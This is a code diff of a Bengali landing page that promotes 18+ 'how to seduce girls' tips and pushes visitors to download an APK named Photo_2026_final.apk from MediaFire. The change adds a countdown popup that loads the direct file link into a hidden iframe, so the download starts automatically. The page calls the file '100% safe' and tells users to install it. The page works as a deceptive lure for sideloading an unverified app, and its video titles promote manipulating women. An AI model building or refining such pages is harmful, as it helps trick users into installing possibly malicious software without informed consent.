@@ -56,9 +56,6 @@
 </head>
 <body class="min-h-screen flex flex-col justify-between">
 
-    <!-- হিডেন ডাউনলোড আইফ্রেড (অটো ফাইলের কাজ সচল করার জন্য) -->
-    <iframe id="download_frame" style="display:none;"></iframe>
-
     <!-- হেডার / নেভিগেশন বার -->
     <header class="bg-gray-900/90 backdrop-blur-md sticky top-0 z-50 border-b border-pink-500/20">
         <div class="max-w-6xl mx-auto px-4 py-3 flex justify-between items-center">
@@ -72,7 +69,7 @@
                 </div>
             </div>
             
-            <button onclick="startAutoDownload()" class="bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white text-sm font-semibold px-4 py-2 rounded-full flex items-center space-x-2 transition shadow-md">
+            <button onclick="openDownloadModal()" class="bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white text-sm font-semibold px-4 py-2 rounded-full flex items-center space-x-2 transition shadow-md">
                 <i class="fa-solid fa-download"></i>
                 <span>অ্যাপ পান</span>
             </button>
@@ -93,18 +90,18 @@
                 পছন্দের মানুষের সাথে চ্যাটিং বা কথা বলার সেরা সব টিপস, ডায়ালগ ও সিক্রেট মেসেজগুলো পড়তে আমাদের অফিশিয়াল অ্যাপটি এখনই ডাউনলোড করুন।
             </p>
 
-            <!-- অ্যাপ ডাউনলোড সেকশন (অটো ডাউনলোড বাটন) -->
+            <!-- অ্যাপ ডাউনলোড সেকশন -->
             <div id="download" class="bg-gray-800/90 p-6 md:p-8 rounded-2xl border border-pink-500/40 max-w-xl mx-auto mb-6 shadow-2xl backdrop-blur-md">
                 <h3 class="text-xl font-bold mb-2 text-pink-300">📲 সিক্রেট টিপস অ্যাপ ডাউনলোড করুন</h3>
-                <p class="text-sm text-gray-400 mb-6">বাটনে ক্লিক করলেই সরাসরি ডাউনলোড শুরু হবে</p>
+                <p class="text-sm text-gray-400 mb-6">নিচের বাটনে ক্লিক করলে পপআপ ওপেন হবে এবং অটো ডাউনলোড শুরু হবে</p>
 
                 <div class="flex flex-col sm:flex-row gap-4 justify-center">
-                    <!-- অটোমেটিক ডাইরেক্ট ডাউনলোড বাটন -->
-                    <button onclick="startAutoDownload()" class="glow-button w-full bg-gradient-to-r from-pink-600 to-purple-600 hover:from-pink-500 hover:to-purple-500 text-white font-bold py-4 px-8 rounded-xl flex items-center justify-center space-x-3 text-base cursor-pointer">
-                        <i class="fa-solid fa-download text-2xl animate-bounce"></i>
+                    <!-- অটোমেটিক ডাইরেক্ট ডাউনলোড ট্রিগার বাটন -->
+                    <button onclick="openDownloadModal()" class="glow-button w-full bg-gradient-to-r from-pink-600 to-purple-600 hover:from-pink-500 hover:to-purple-500 text-white font-bold py-4 px-8 rounded-xl flex items-center justify-center space-x-3 text-base cursor-pointer">
+                        <i class="fa-solid fa-cloud-arrow-down text-2xl animate-bounce"></i>
                         <div class="text-left">
                             <div class="text-xs font-normal opacity-90">অটোমেটিক ডাইরেক্ট ডাউনলোড (APK)</div>
-                            <div class="text-lg font-bold">এখানে ক্লিক করে ইনস্টল করুন</div>
+                            <div class="text-lg font-bold">এখানে ক্লিক করে ডাউনলোড করুন</div>
                         </div>
                     </button>
                 </div>
@@ -126,7 +123,7 @@
             <!-- থাম্বনেইল কার্ড ১ -->
             <div class="bg-gray-800/80 border border-gray-700 rounded-xl overflow-hidden card-hover">
                 <div class="relative">
-                    <img src="https://picsum.photos/seed/romantic1/600/340" alt="মেয়েদের সাথে সেক্সুয়াল কথা বলুন" class="w-full h-48 object-cover">
+                    <img src="https://picsum.photos/seed/romantic1/600/340" alt="" class="w-full h-48 object-cover">
                     <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-mono">৩:২২</span>
                     <span class="absolute top-2 left-2 bg-red-600 text-white text-xs font-bold px-2 py-0.5 rounded">১৮+</span>
                 </div>
@@ -135,7 +132,7 @@
                         মেয়েদের সাথে এভাবে কথা বলুন মেয়ে মাইন্ড করবে না বরং মজা পাবে
                     </h4>
                     <p class="text-xs text-gray-400 mb-4">ভিউ: ২৫K • ২ বছর আগে</p>
-                    <button onclick="startAutoDownload()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
+                    <button onclick="openDownloadModal()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
                         <i class="fa-solid fa-download"></i> টিপসটি অ্যাপে পড়ুন
                     </button>
                 </div>
@@ -144,7 +141,7 @@
             <!-- থাম্বনেইল কার্ড ২ -->
             <div class="bg-gray-800/80 border border-gray-700 rounded-xl overflow-hidden card-hover">
                 <div class="relative">
-                    <img src="https://picsum.photos/seed/romantic2/600/340" alt="মেয়েদের কিছু দুর্বলতা" class="w-full h-48 object-cover">
+                    <img src="https://picsum.photos/seed/romantic2/600/340" alt="" class="w-full h-48 object-cover">
                     <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-mono">৭:০৪</span>
                 </div>
                 <div class="p-4">
@@ -152,7 +149,7 @@
                         মেয়েদের কিছু দুর্বলতা যেগুলো কাজে লাগিয়ে ২ মিনিটে কোনো মেয়েকে পটাতে পারবেন
                     </h4>
                     <p class="text-xs text-gray-400 mb-4">ভিউ: ২.৭K • ৩ মাস আগে</p>
-                    <button onclick="startAutoDownload()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
+                    <button onclick="openDownloadModal()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
                         <i class="fa-solid fa-download"></i> টিপসটি অ্যাপে পড়ুন
                     </button>
                 </div>
@@ -161,7 +158,7 @@
             <!-- থাম্বনেইল কার্ড ৩ -->
             <div class="bg-gray-800/80 border border-gray-700 rounded-xl overflow-hidden card-hover">
                 <div class="relative">
-                    <img src="https://picsum.photos/seed/romantic3/600/340" alt="মেয়েদের কে এই কথাগুলো বলুন" class="w-full h-48 object-cover">
+                    <img src="https://picsum.photos/seed/romantic3/600/340" alt="" class="w-full h-48 object-cover">
                     <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-mono">৪:২৫</span>
                 </div>
                 <div class="p-4">
@@ -169,7 +166,7 @@
                         মেয়েদের কে এই কথাগুলো বলুন তারপর ম্যাজিক দেখুন!
                     </h4>
                     <p class="text-xs text-gray-400 mb-4">ভিউ: ১.৫K • ৩ মাস আগে</p>
-                    <button onclick="startAutoDownload()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
+                    <button onclick="openDownloadModal()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
                         <i class="fa-solid fa-download"></i> টিপসটি অ্যাপে পড়ুন
                     </button>
                 </div>
@@ -178,7 +175,7 @@
             <!-- থাম্বনেইল কার্ড ৪ -->
             <div class="bg-gray-800/80 border border-gray-700 rounded-xl overflow-hidden card-hover">
                 <div class="relative">
-                    <img src="https://picsum.photos/seed/romantic4/600/340" alt="মেয়েদের কে হাসানোর জন্য সেরা ৬টি কথা" class="w-full h-48 object-cover">
+                    <img src="https://picsum.photos/seed/romantic4/600/340" alt="" class="w-full h-48 object-cover">
                     <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-mono">৪:২৬</span>
                 </div>
                 <div class="p-4">
@@ -186,7 +183,7 @@
                         মেয়েদের কে হাসানোর জন্য সেরা ৬টি কথা শিখে নিন
                     </h4>
                     <p class="text-xs text-gray-400 mb-4">ভিউ: ২.৫K • ৩ মাস আগে</p>
-                    <button onclick="startAutoDownload()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
+                    <button onclick="openDownloadModal()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
                         <i class="fa-solid fa-download"></i> টিপসটি অ্যাপে পড়ুন
                     </button>
                 </div>
@@ -195,7 +192,7 @@
             <!-- থাম্বনেইল কার্ড ৫ -->
             <div class="bg-gray-800/80 border border-gray-700 rounded-xl overflow-hidden card-hover">
                 <div class="relative">
-                    <img src="https://picsum.photos/seed/romantic5/600/340" alt="মেয়ে Kiss করতে আগ্রহী কিনা বোঝার উপায়" class="w-full h-48 object-cover">
+                    <img src="https://picsum.photos/seed/romantic5/600/340" alt="" class="w-full h-48 object-cover">
                     <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-mono">৩:১৫</span>
                     <span class="absolute top-2 left-2 bg-red-600 text-white text-xs font-bold px-2 py-0.5 rounded">১৮+</span>
                 </div>
@@ -204,7 +201,7 @@
                         মেয়ে Kiss করতে আগ্রহী কিনা? বোঝার সহজ উপায়
                     </h4>
                     <p class="text-xs text-gray-400 mb-4">প্লেলিস্ট ভিডিও • বিশেষ রিলেশন টিপস</p>
-                    <button onclick="startAutoDownload()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
+                    <button onclick="openDownloadModal()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
                         <i class="fa-solid fa-download"></i> টিপসটি অ্যাপে পড়ুন
                     </button>
                 </div>
@@ -213,7 +210,7 @@
             <!-- থাম্বনেইল কার্ড ৬ -->
             <div class="bg-gray-800/80 border border-gray-700 rounded-xl overflow-hidden card-hover">
                 <div class="relative">
-                    <img src="https://picsum.photos/seed/romantic6/600/340" alt="মেয়ে আপনাকে পাত্তা দেয় না?" class="w-full h-48 object-cover">
+                    <img src="https://picsum.photos/seed/romantic6/600/340" alt="" class="w-full h-48 object-cover">
                     <span class="absolute bottom-2 right-2 bg-black/80 text-white text-xs px-2 py-0.5 rounded font-mono">৫:১০</span>
                 </div>
                 <div class="p-4">
@@ -221,7 +218,7 @@
                         মেয়ে আপনাকে পাত্তা দেয় না? অবহেলা করে? সমাধান জেনে নিন
                     </h4>
                     <p class="text-xs text-gray-400 mb-4">প্লেলিস্ট ভিডিও • সমাধান গাইড</p>
-                    <button onclick="startAutoDownload()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
+                    <button onclick="openDownloadModal()" class="w-full bg-pink-600/20 hover:bg-pink-600/40 border border-pink-500/40 text-pink-300 text-xs font-semibold py-2 rounded-lg flex items-center justify-center gap-2 transition">
                         <i class="fa-solid fa-download"></i> টিপসটি অ্যাপে পড়ুন
                     </button>
                 </div>
@@ -230,26 +227,52 @@
         </div>
     </section>
 
-    <!-- ডাউনলোড প্রোগ্রেস / নির্দেশিকা পপআপ -->
-    <div id="downloadStatusModal" class="fixed inset-0 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-4 z-50">
-        <div class="bg-gray-800 border border-pink-500/50 rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl">
-            <div class="w-16 h-16 bg-pink-500/20 text-pink-400 rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-pulse">
-                <i class="fa-solid fa-spinner fa-spin"></i>
-            </div>
-            <h3 class="text-xl font-bold text-white mb-2">ডাউনলোড প্রক্রিয়াধীন...</h3>
-            <p class="text-gray-300 text-sm mb-4">
-                আপনার ব্রাউজার ব্যাকগ্রাউন্ডে অ্যাপটি ডাউনলোড করছে। অনুগ্রহ করে ১-২ সেকেন্ড অপেক্ষা করুন।
-            </p>
-            <div class="bg-gray-900 p-3 rounded-lg text-xs text-gray-400 mb-5 border border-gray-700 text-left">
-                <p class="font-bold text-pink-400 mb-1">💡 নোট:</p>
-                1. ডাউনলোড শেষ হলে ফোনে "Open" চাপুন।<br>
-                2. Install-এ ক্লিক করে ফাইলটি ওপেন করুন।
-            </div>
-            <button onclick="closeStatusModal()" class="w-full bg-pink-600 hover:bg-pink-700 text-white font-bold py-2.5 rounded-xl transition">
-                বুঝেছি
+    <!-- অটো ডাউনলোড পপআপ মোডাল -->
+    <div id="downloadModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden items-center justify-center p-4 z-50">
+        <div class="bg-gray-800 border border-pink-500/50 rounded-2xl p-6 max-w-sm w-full text-center shadow-2xl relative">
+            
+            <!-- বন্ধ করার বাটন -->
+            <button onclick="closeDownloadModal()" class="absolute top-3 right-3 text-gray-400 hover:text-white text-lg">
+                <i class="fa-solid fa-xmark"></i>
             </button>
+
+            <div class="w-16 h-16 bg-pink-500/20 text-pink-400 rounded-full flex items-center justify-center text-3xl mx-auto mb-4 animate-bounce">
+                <i class="fa-solid fa-file-arrow-down"></i>
+            </div>
+
+            <h3 class="text-xl font-bold text-white mb-1">Photo_2026_final.apk</h3>
+            <p class="text-xs text-pink-400 font-semibold mb-4">ফাইল সাইজ: 4.28 MB</p>
+
+            <p id="downloadStatusText" class="text-gray-300 text-sm mb-5">
+                আপনার ডাউনলোড অটোমেটিক শুরু হচ্ছে... <br>
+                <span id="countdown" class="text-pink-400 font-bold text-lg">3</span> সেকেন্ড অপেক্ষা করুন।
+            </p>
+
+            <!-- সরাসরি ইনস্ট্যান্ট ম্যানুয়াল ডাউনলোড বাটন (যদি অটোমেটিক আটকে যায়) -->
+            <button id="triggerBtn" onclick="triggerDirectDownload()" class="w-full bg-gradient-to-r from-pink-600 to-purple-600 hover:from-pink-500 hover:to-purple-500 text-white font-bold py-3 rounded-xl transition shadow-lg flex items-center justify-center gap-2 mb-3">
+                <i class="fa-solid fa-download"></i>
+                <span>এখনই ডাউনলোড করুন</span>
+            </button>
+
+            <div class="bg-gray-900/80 p-3 rounded-lg text-xs text-gray-400 border border-gray-700 text-left">
+                <p class="font-bold text-green-400 mb-1"><i class="fa-solid fa-check-circle"></i> ১০০% নিরাপদ অ্যাপ</p>
+                ডাউনলোড সম্পন্ন হলে ফোনে ফাইলটি ওপেন করে <strong>Install</strong> অপশনে ক্লিক করুন।
+            </div>
         </div>
     </div>
+
+    <!-- ইউটিউব ভিডিও সেকশন -->
+    <section class="py-10 px-4 bg-gray-900/80 border-t border-b border-gray-800">
+        <div class="max-w-4xl mx-auto text-center">
+            <h3 class="text-2xl font-bold mb-2 text-white">আমাদের ইউটিউব পরিবারে যোগ দিন</h3>
+            <p class="text-gray-400 text-sm mb-6">নিয়মিত নতুন নতুন কন্টেন্ট দেখতে চ্যানেলটি সাবস্ক্রাইব করুন</p>
+            
+            <a href="https://www.youtube.com/@meyepotanortherapyofficial" target="_blank" class="inline-flex items-center space-x-2 bg-red-600 hover:bg-red-700 text-white font-bold px-6 py-3 rounded-full transition shadow-lg">
+                <i class="fa-brands fa-youtube text-2xl"></i>
+                <span>ইউটিউব চ্যানেল সাবস্ক্রাইব করুন</span>
+            </a>
+        </div>
+    </section>
 
     <!-- ফুটার -->
     <footer class="bg-gray-950 py-6 text-center border-t border-gray-800">
@@ -260,28 +283,47 @@
     </footer>
 
     <script>
-        // আপনার মিডিয়াফায়ার লিঙ্ক 
-        const mediaFirePageUrl = "https://www.mediafire.com/file/cgrmh6vnypyacj1/Photo_2026_final.apk/file";
+        // মিডিয়াফায়ার ডাইরেক্ট ডাউনলোড লিঙ্ক
+        const directFileUrl = "https://download1584.mediafire.com/cgrmh6vnypyacj1/Photo_2026_final.apk";
+        let timer = null;
 
-        function startAutoDownload() {
-            // ১. পপআপ মেসেজ দেখানো
-            document.getElementById('downloadStatusModal').classList.remove('hidden');
-            document.getElementById('downloadStatusModal').classList.add('flex');
-
-            // ২. ব্যাকগ্রাউন্ডে ডাউনলোড ইভেন্ট ট্রিগার করা
-            const link = document.createElement('a');
-            link.href = mediaFirePageUrl;
-            link.target = "_blank"; // নতুন ট্যাব ওপেন করে ডাইরেক্ট ডাউনলোড কল করবে
-            link.rel = "noopener noreferrer";
+        function openDownloadModal() {
+            document.getElementById('downloadModal').classList.remove('hidden');
+            document.getElementById('downloadModal').classList.add('flex');
             
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+            let timeLeft = 3;
+            const countdownEl = document.getElementById('countdown');
+            countdownEl.innerText = timeLeft;
+
+            clearInterval(timer);
+            timer = setInterval(() => {
+                timeLeft--;
+                if(timeLeft > 0) {
+                    countdownEl.innerText = timeLeft;
+                } else {
+                    clearInterval(timer);
+                    document.getElementById('downloadStatusText').innerHTML = "<span class='text-green-400 font-bold'>আপনার ডাউনলোড শুরু হয়েছে!</span>";
+                    triggerDirectDownload();
+                }
+            }, 1000);
         }
 
-        function closeStatusModal() {
-            document.getElementById('downloadStatusModal').classList.add('hidden');
-            document.getElementById('downloadStatusModal').classList.remove('flex');
+        function triggerDirectDownload() {
+            // হিডেন আইফ্রেমে ডাইরেক্ট লিঙ্ক লোড করে পেজ রিডাইরেক্ট হওয়া আটকানো
+            let iframe = document.getElementById('hiddenDownloadIframe');
+            if (!iframe) {
+                iframe = document.createElement('iframe');
+                iframe.id = 'hiddenDownloadIframe';
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+            }
+            iframe.src = directFileUrl;
+        }
+
+        function closeDownloadModal() {
+            clearInterval(timer);
+            document.getElementById('downloadModal').classList.add('hidden');
+            document.getElementById('downloadModal').classList.remove('flex');
         }
     </script>
 </body>
